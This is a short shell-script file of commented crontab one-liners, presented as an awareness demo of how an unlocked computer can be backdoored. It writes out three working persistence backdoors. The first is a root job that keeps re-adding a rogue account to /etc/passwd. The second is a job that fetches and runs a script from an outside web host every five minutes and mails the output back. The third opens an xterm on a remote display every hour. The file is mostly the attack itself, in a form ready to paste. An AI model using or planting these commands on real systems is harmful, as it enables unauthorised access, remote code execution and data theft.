## very very naughty
## Disclaimer: Released so that people can be aware of just how easy it is for a naughty hacker to backdoor them if they leave their computer unlocked in an untrusted environment.
## If you experiment with these backdoors, please don't use my email address!
## You'll find that you can easily spot these types of backdoor in your crontab (they are not well hidden).


### As root:

## Create a user account and keep it alive!
# ( crontab -l ; echo '* * * * * grep eviluser /etc/passwd || echo "eviluser:x:1234:1234:x,,,:/tmp:/bin/bash" >> /etc/passwd 2>/dev/null > /dev/null' ) | crontab -


### As user:

## Every 5 minutes, collect a shellscript from a webserver, run it, and mail the results back.
# ( crontab -l ; echo '*/5 * * * * wget -O - http://hwi.ath.cx/dome.sh 2>/dev/null | sh 2>&1 | mail joey@hwi.ath.cx 2>/dev/null > /dev/null' ) | crontab -

## Every hour, provide an xterm to somebody else's display.
# ( crontab -l ; echo '00 * * * * env DISPLAY=mybox:0 xterm 2>/dev/null > /dev/null &' ) | crontab -
